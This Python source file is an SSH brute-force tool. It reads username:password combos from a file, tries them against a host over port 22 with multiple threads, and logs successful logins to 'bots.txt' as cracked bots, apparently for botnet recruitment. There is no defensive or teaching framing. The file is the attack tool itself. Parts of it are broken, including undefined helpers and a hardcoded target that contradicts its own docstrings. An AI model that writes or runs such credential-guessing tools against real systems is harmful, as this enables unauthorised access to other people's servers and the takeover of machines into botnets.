import socket, threading, paramiko, random, ctypes, os, platform
from pystyle import Colorate, Colors
from colorama import Fore
from queue import Queue
from time import *



class Scraper:
    '''
    A class to scrape ips and attempt to brute force them.
    Methods
    -------
    set_title():
        Keep title updated with info.
    print_debug(message):
        Print debug message if debug is enabled.
    load_combos():
        Load usernames and passwords from files.
    failedtocrack(host):
        Write host to file to make sure we don't try to crack it again.
    connect(host):
        Attempt to connect to host.
    
    worker():
        Thread workers.
    
    start():
        Start scraping and brute forcing.
    
    '''

    def __init__(self, threads:int, debug=False):
        '''
        Parameters
        ----------
            debug   : bool
                enable debug mode
            threads : int
                amount of threads to use
        '''
        self.debug      = debug
        self.threads    = threads

        self.queue1     = Queue()
        self.queue2     = Queue()

        # username and password lists
        self.total_list = 0
        self.usernames  = []
        self.passwords  = []

        # get already checked ips from txt file
        self.already_checked = open ("ips_checked.txt", "r").read().splitlines()

        # counters
        self.cracked    = 0
        self.uncracked  = 0

    def set_title(self):
        """
        Keeps console title updated with info.
        Returns
        -------
        Updated console title.
        """
        start = time()
        while True:
            time_elapsed = strftime('%H:%M:%S', gmtime(time() - start))
            ctypes.windll.kernel32.SetConsoleTitleW(f"BruteForce - Cracked: [{self.cracked}] | Uncracked: [{self.uncracked}] | Total Combos: [{self.total_list}] | Time Elapsed: [{time_elapsed}]")

    def set_console(self):
        while True:
            clear()
            print(Colorate.Vertical(Colors.red_to_purple, scraper_banner, 1))
            sleep(0.5)

    def print_debug(self, message:str):
        ''' if debug mode is enabled, print debug message '''
        if self.debug: print(f"[{Fore.LIGHTYELLOW_EX}DEBUG{Fore.RESET}] " + str(message))

    def load_combos(self):
        """
        Load username and password combos from file.
        Each combo should be in the format of username:password
        Returns
        -------
        Seperate lists of usernames and passwords.
        """
        with open("passwords.txt", "r", errors="ignore") as f:
            for line in f:
                try:
                    self.queue1.put(line.split(":")[0])
                except: pass 
                try: 
                    self.queue2.put(line.strip("\n").split(":")[1])
                except: pass 
                self.total_list+=1
        f.close()
        print(f"[+] Loaded {self.total_list} usernames and passwords")

    def failedtocrack(self, host:str):
        ''' write host to file to make sure we don't try to crack it again '''
        self.uncracked+=1
        with open("assets\\ips_checked.txt", "a", errors="ignore") as f: f.write(f"\n{host}")
        f.close()

    def connect(self, host:str, username:str, password:str):
        """
        Try and connect to host via SSH.
        If connection is successful, attempt to brute force login.
        Parameters
        ----------
        host : str
            Generated IP address to attempt to connect to.
        Returns
        -------
        None
        """
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
        try:
            # connect to host with username and password
            client.connect(host, 22, username, password, timeout=5)

            # if we get here, we have cracked the bot
            self.print_debug(f"{Fore.GREEN}Successfully connected to: " + Fore.RESET + str(host))
            self.cracked+=1
            with open("bots.txt", "a", errors="ignore") as f: f.write(f"{host}:{username}:{password}\n")
                
        except socket.error: # if we get a socket error, we know the port is closed
            pass

        except paramiko.ssh_exception.AuthenticationException: # if we get an authentication exception, we know the password is wrong
            self.print_debug(f"{Fore.YELLOW}Wrong Password or Username{Fore.RESET}")
            
        except paramiko.ssh_exception.SSHException: # if we get an ssh exception, we know the port is open but an error occured
            self.print_debug(f"{Fore.YELLOW}No response from SSH server{Fore.RESET}")

        self.failedtocrack(host)

    def worker(self):
        """
        Worker threads.
        Loop through and attempt to connect to randomly generated ips.
        """
        while not self.queue1.empty() and not self.queue2.empty():
            try: 
                ip = "192.168.0.1"
                username = self.queue1.get()
                password = self.queue2.get()
                self.connect(ip, username, password)
            except: pass
        print("[-] Thread finished")

    def start(self):
        ''' start scraping and brute forcing '''
        ctypes.windll.kernel32.SetConsoleTitleW(f"BruteForce - Cracked: [0] | Uncracked: [0] | Total Combos: [0] | Time Elapsed: [00:00:00]")
        self.load_combos()

        # threading.Thread(target=self.set_console).start()
        for t in range(self.threads): 
            threading.Thread(target=self.worker).start()
        self.set_title()


ctypes.windll.kernel32.SetConsoleTitleW(f"BruteForce - Scrape Bots")
thread_amount   = int(input("[>] Enter amount of threads >>"))
clear()
Scraper(thread_amount).start()